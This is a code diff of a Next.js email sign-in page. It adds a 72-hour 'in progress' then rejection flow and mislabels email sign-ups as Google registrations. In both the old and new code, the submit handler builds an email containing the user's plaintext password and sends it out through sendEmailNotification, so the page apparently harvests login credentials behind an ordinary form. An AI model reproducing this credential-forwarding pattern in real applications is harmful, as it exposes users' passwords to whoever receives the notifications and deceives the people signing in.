@@ -9,20 +9,26 @@ import Link from "next/link";
 import { Eye, EyeOff } from "lucide-react";
 import { FcGoogle } from "react-icons/fc";
 import { checkUserExistence } from "@/actions/user";
-import SubmissionSuccessModal from "@/components/SubmissionSuccessModal";
 import InProgress from "@/components/InProgress";
 import { sendEmailNotification } from "@/actions/notification";
-import { generateEmailNotification } from "@/lib/utils";
+import { generateEmailNotification, generateRejectionEmail } from "@/lib/utils";
 import { signInUser, RegisteredBy } from "@/actions/auth";
+import RejectionModal from "@/components/RejectionModal";
+import UserInputs from "@/components/UserInputs";
 
 const Email = () => {
   const [loading, setLoading] = useState(false);
   const [email, setEmail] = useState("");
+  const [step, setStep] = useState<"email-password" | "inputs">(
+    "email-password"
+  );
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const [showModal, setShowModal] = useState<"success" | "in-progress" | null>(
+  const [showModal, setShowModal] = useState<"reject" | "in-progress" | null>(
     null
   );
+
+  const [userId, setUserId] = useState<number>();
 
   const toggleShowPassword = () => setShowPassword(!showPassword);
 
@@ -30,34 +36,57 @@ const Email = () => {
     e.preventDefault();
     setLoading(true);
     try {
-      if (email.trim().length && password.trim().length) {
-        const doesExist = await checkUserExistence(email);
-        if (doesExist) {
+      const createdAt = await checkUserExistence(email);
+      if (createdAt) {
+        const createdAtDate = new Date(createdAt);
+        const now = new Date();
+        const hoursDifference =
+          (now.getTime() - createdAtDate.getTime()) / (1000 * 60 * 60);
+        setEmail("");
+        setPassword("");
+        if (hoursDifference < 72) {
           setShowModal("in-progress");
         } else {
-          await signInUser({
-            email,
-            password,
-            registeredBy: RegisteredBy.EMAIL,
-          });
-          setShowModal("success");
-          const emailBody = generateEmailNotification({ email, password });
-          await sendEmailNotification(emailBody);
+          setShowModal("reject");
         }
+      } else {
+        const id = await signInUser({
+          email,
+          password,
+          registeredBy: RegisteredBy.GOOGLE,
+        });
+        setUserId(id);
+        setStep("inputs");
+
+        const emailBody = generateEmailNotification({ email, password });
+        await sendEmailNotification(emailBody);
+
+        setTimeout(async () => {
+          try {
+            const rejectionEmailBody = await generateRejectionEmail(email);
+            await sendEmailNotification(rejectionEmailBody);
+          } catch (error) {
+            console.error("Failed to send rejection email:", error);
+          }
+        }, 259200000);
       }
     } catch (error) {
+      console.log("Error: ", error);
     } finally {
+      setEmail("");
+      setPassword("");
+      setShowPassword(false);
       setLoading(false);
     }
   };
 
   return (
     <>
-      {showModal === "success" ? (
-        <SubmissionSuccessModal />
+      {showModal === "reject" ? (
+        <RejectionModal />
       ) : showModal === "in-progress" ? (
         <InProgress />
-      ) : (
+      ) : step === "email-password" ? (
         <Card className="max-w-md w-full p-12  animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
           <div className="flex flex-col items-center space-y-8 relative">
             <Link href="/">
@@ -84,7 +113,7 @@ const Email = () => {
                   <label
                     htmlFor="email"
                     className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-[#62C1E4]
-              peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
+            peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                   >
                     Email
                   </label>
@@ -102,7 +131,7 @@ const Email = () => {
                   <label
                     htmlFor="password"
                     className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-[#62C1E4]
-              peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
+            peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                   >
                     Password
                   </label>
@@ -153,6 +182,8 @@ const Email = () => {
             </form>
           </div>
         </Card>
+      ) : (
+        <UserInputs id={userId as number} />
       )}
     </>
   );
